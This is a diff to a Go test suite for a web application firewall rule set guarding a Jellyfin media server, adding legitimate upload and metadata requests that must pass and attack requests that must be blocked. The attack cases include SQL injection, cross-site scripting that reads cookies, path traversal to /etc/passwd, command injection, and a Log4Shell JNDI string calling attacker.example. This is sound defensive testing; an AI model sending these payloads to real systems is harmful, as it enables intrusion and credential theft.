@@ -116,6 +116,34 @@ var jfImages = []struct{ provider, url string }{
 	{"Kitsu", "https://media.example.org/anime/poster_images/1/original.jpg?1597604210"},
 }
 
+// jfOverviews are what a metadata provider says of a film, a show, an
+// episode or a person, which Identify sends back as it found it: prose with
+// quotes, dashes, brackets, colons and semicolons, in English and not.
+var jfOverviews = []string{
+	`When the night ferry to Wexmoor vanishes in a storm, harbour pilot Mara Lune (a widow with nothing left to lose) sets out to find its "ghost" crew before the tide turns – and before the mayor's men bury the truth.`,
+	"Season 2: the Kite-Line crew is back, and this summer it's personal! Three friends, one stubborn goat and a borrowed van race across the salt flats; nobody's sure they'll make it.",
+	`Hélène Marchetti (born 12 March 1971 in Lyon) is a French-Italian actress & director, known for "The Night Ferry" (2019), "Paper Harbour" (2022) and her work on stage.`,
+	"港町で暮らす少女ハルは、ある夜、灯台の光が消えていることに気づく。祖父の古い地図を手に、彼女は霧の向こうの島へ向かう。",
+	"Ein pensionierter Uhrmacher entdeckt auf dem Dachboden einen Brief aus dem Jahr 1923 – und macht sich auf die Suche nach der Absenderin.",
+	"In a city where music is outlawed, a street sweeper named Juno hides a radio under her floorboards... until the night someone else starts listening. Based on the novel by Ada Wren.",
+	`Leo and Priya's plan to save the bakery goes sideways when the inspector shows up early; meanwhile, Gran's "secret recipe" turns out to be anything but.`,
+}
+
+// A subtitle file in the two common formats, and a song's timed lyrics, as
+// people upload them.
+const (
+	jfSRT = "1\n00:00:01,000 --> 00:00:04,000\n<i>The ferry's late again...</i>\n\n2\n00:00:05,500 --> 00:00:08,250\n" +
+		"\"Who's on the night shift?\" - Mara, it's you.\n"
+	jfASS = "[Script Info]\nTitle: Lanternfall 01\nScriptType: v4.00+\n\n[V4+ Styles]\nFormat: Name, Fontname, Fontsize, PrimaryColour\n" +
+		"Style: Default,Arial,48,&H00FFFFFF\n\n[Events]\nFormat: Layer, Start, End, Style, Text\n" +
+		"Dialogue: 0,0:00:01.00,0:00:04.00,Default,{\\i1}The ferry's late again...{\\i0}\n"
+	jfLRC = "[ar:Jo & the Kite-Liners]\n[ti:Lanterns at Low Tide]\n[00:12.40]Out past the harbour, where the lanterns go\n" +
+		"[00:17.85]I'll wait for you - I'll wait, you know...\n"
+)
+
+// picture is a picture's file of n bytes, in base64 as the clients send it.
+func (g jf) picture(n int) string { return base64.StdEncoding.EncodeToString(g.bytes(n)) }
+
 // password is one a password manager made.
 func (g jf) password() string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?`~|\\"
@@ -437,6 +465,55 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 					}
 				}
 			}
+			// What the web client's editors send: a picture, subtitles or
+			// lyrics from the computer, one picture past the profile's body
+			// limit, and Identify's search and the match it takes, with the
+			// plot summary and, for an album, the artists. They draw from a
+			// generator of their own, so the requests below are drawn as
+			// before.
+			const js = "application/json"
+			u := jf{vw{rand.New(rand.NewPCG(uint64(pl), 3))}}
+			web, kt, item := u.client(0), u.client(jfClients-1), u.id()
+			artist := func(name string) map[string]any {
+				return map[string]any{"Name": name, "ProviderIds": map[string]any{"MusicBrainzArtist": u.uuid()}, "Overview": nil,
+					"ImageUrl": nil, "SearchProviderName": nil, "AlbumArtist": nil, "Artists": []any{}}
+			}
+			subtitle := func(file, format string) string {
+				return vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(file)), "Language": "eng", "Format": format,
+					"IsForced": false, "IsHearingImpaired": u.r.IntN(2) == 0})
+			}
+			rs := []jfRequest{
+				{"POST", "/Items/" + item + "/Images/Primary", "image/jpeg", u.picture(48 << 10), false, web},
+				{"POST", "/Items/" + item + "/Images/Backdrop/1", "image/png", u.picture(10 << 20), false, web},
+				{"POST", "/Items/" + item + "/Images/Logo", "image/svg+xml", u.picture(6 << 10), false, web},
+				{"POST", "/Users/" + u.id() + "/Images/Primary", "image/webp", u.picture(24 << 10), false, web},
+				{"POST", "/UserImage?userId=" + u.id(), "image/gif", u.picture(12 << 10), false, kt},
+				{"POST", "/Branding/Splashscreen", "image/avif", u.picture(64 << 10), false, web},
+				{"POST", "/Videos/" + item + "/Subtitles", js, subtitle(jfSRT, "srt"), false, web},
+				{"POST", "/Videos/" + item + "/Subtitles", js, subtitle(jfASS, "ass"), false, web},
+				{"POST", "/Audio/" + item + "/Lyrics?fileName=" + uriComponent("01 - Lanterns at Low Tide (Live).lrc"), "text/plain", jfLRC, false, web},
+				{"POST", "/Items/RemoteSearch/Apply/" + item, js, vwJSON(map[string]any{"Name": "Lanterns at Low Tide",
+					"ProviderIds": map[string]any{"MusicBrainzAlbum": u.uuid(), "MusicBrainzReleaseGroup": u.uuid()}, "ProductionYear": 2017,
+					"PremiereDate": "2017-05-12T00:00:00.0000000Z", "SearchProviderName": "MusicBrainz", "Overview": nil,
+					"AlbumArtist": artist("Jo & the Kite-Liners"), "Artists": []any{artist("Jo & the Kite-Liners"), artist("Marigold Static")}}), false, web},
+			}
+			for _, kind := range []string{"Movie", "Series", "Person", "MusicAlbum"} {
+				rs = append(rs, jfRequest{"POST", "/Items/RemoteSearch/" + kind, js, vwJSON(map[string]any{"SearchInfo": map[string]any{
+					"ProviderIds": map[string]any{"Tmdb": "", "Imdb": ""}, "Name": u.pick("Hélène Marchetti", "Lanterns at Low Tide", "The Night Ferry"),
+					"Year": 2019}, "ItemId": u.id()}), false, web})
+			}
+			for _, overview := range jfOverviews {
+				rs = append(rs, jfRequest{"POST", "/Items/RemoteSearch/Apply/" + u.id() + "?ReplaceAllImages=" + u.pick("true", "false"), js,
+					vwJSON(map[string]any{"Name": "The Night Ferry", "ProviderIds": map[string]any{"Tmdb": "84512", "Imdb": "tt0123456"},
+						"ProductionYear": 2019, "PremiereDate": "2019-04-05T00:00:00.0000000Z",
+						"ImageUrl": "https://image.example.org/t/p/original/7xdcg2lMLzgeonyLGcTJFiz4soC.jpg", "SearchProviderName": "TheMovieDb",
+						"Overview": overview, "Artists": []any{}}), false, web})
+			}
+			for _, r := range rs {
+				if status := jfSend(t, plain, r); status != http.StatusOK {
+					t.Errorf("%s %s %.80q (%s): %d", r.method, r.path, r.body, r.client.userAgent, status)
+				}
+			}
 			for i := range 2 * jfClients {
 				for _, r := range g.requests(g.client(i % jfClients)) {
 					if status := jfSend(t, plain, r); status != http.StatusOK {
@@ -454,7 +531,8 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 // An attack CRS alone refuses at a level is refused with the set loaded
 // too, whether it sits in an argument the clients fill with ids and lists
 // or comes in the Authorization header. Text, which the set reads as
-// paranoia 2 does, keeps what CRS alone refuses there.
+// paranoia 2 does, keeps what CRS alone refuses there, and a plot summary
+// Identify sends back what CRS alone refuses at paranoia 1.
 func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := jf{vw{rand.New(rand.NewPCG(7, 8))}}
@@ -491,6 +569,18 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
 			uriComponent("https://image.example.org/t/p/original/x.jpg' UNION SELECT Password FROM Users--"), "", "", false, c},
 		{"GET", "/Items/" + g.id() + "/RemoteImages?type=Primary&ProviderName=" + uriComponent("<script>alert(1)</script>"), "", "", false, c},
+		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x",
+			"AlbumArtist": map[string]any{"Name": "x' UNION SELECT Password FROM Users--"}}), false, c},
+		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=" + uriComponent("../../../../etc/passwd"), "text/plain", jfLRC, false, c},
+	}
+	apply := func(body map[string]any) jfRequest {
+		return jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(body), false, c}
+	}
+	inProse := []jfRequest{
+		apply(map[string]any{"Name": "x", "Overview": "<script>alert(document.cookie)</script>"}),
+		apply(map[string]any{"Name": "x", "Overview": "x' UNION SELECT Password FROM Users--"}),
+		apply(map[string]any{"Name": "x", "Overview": "Lost at sea; cat /etc/passwd"}),
+		apply(map[string]any{"Name": "x", "AlbumArtist": map[string]any{"Name": "x", "Overview": "${jndi:ldap://attacker.example/a}"}}),
 	}
 	attacks := []jfRequest{
 		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
@@ -532,14 +622,25 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		// read for everything but commands.
 		{"GET", "/Items/" + uriComponent("x&&whoami") + "/Images/Primary", "", "", true, c},
 		{"GET", "/Persons/" + uriComponent("<script>alert(1)</script>") + "/Images/Primary", "", "", true, c},
+		// A body goes unread only as a picture where pictures go up, as
+		// lyrics where lyrics go up, and as one subtitle file in base64.
+		{"POST", "/Items/" + g.id() + "/Images/Primary", "application/x-www-form-urlencoded", "a=" + url.QueryEscape("<script>alert(1)</script>"), false, c},
+		{"POST", "/Items/" + g.id(), "image/png", g.picture(64), false, c},
+		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=x.lrc", js, vwJSON(map[string]any{"Lyrics": "<script>alert(1)</script>"}), false, c},
+		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": "<script>alert(1)</script>", "Format": "srt"}), false, c},
+		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(jfSRT)),
+			"data": "x' UNION SELECT Password FROM Users--", "Format": "srt"}), false, c},
 	}
 	for pl := 1; pl <= 4; pl++ {
 		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
 			t.Parallel()
 			bare, _ := watchSite(t, pl, false)
-			bareText := bare
+			bareText, bareProse := bare, bare
 			if pl > 2 {
 				bareText, _ = watchSite(t, 2, false)
+			}
+			if pl > 1 {
+				bareProse, _ = watchSite(t, 1, false)
 			}
 			plain, out := watchSite(t, pl, true)
 			refused := 0
@@ -556,7 +657,8 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 			}
 			check(bare, attacks)
 			check(bareText, inText)
-			if total := len(attacks) + len(inText); refused < total/2 {
+			check(bareProse, inProse)
+			if total := len(attacks) + len(inText) + len(inProse); refused < total/2 {
 				t.Errorf("CRS alone refused only %d of %d attacks", refused, total)
 			}
 			if t.Failed() {
